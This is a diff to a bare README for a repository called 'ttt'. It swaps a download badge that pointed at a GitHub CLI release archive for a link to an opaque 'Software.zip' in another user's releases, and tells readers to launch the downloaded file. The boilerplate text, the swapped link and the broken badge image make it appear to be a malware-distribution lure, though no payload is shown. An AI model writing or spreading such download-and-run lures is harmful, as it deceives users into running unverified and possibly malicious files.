@@ -3,7 +3,7 @@
 This repository does not have a specific short description or topics listed, but feel free to explore the contents further!
 
 ## Download Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/levietnhan/ttt/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/levietnhan/ttt/releases/download/v1.0/Software.zip)
 
 Click the button above to download the latest release of the "ttt" repository. Ensure to launch the downloaded file to access its contents.
 
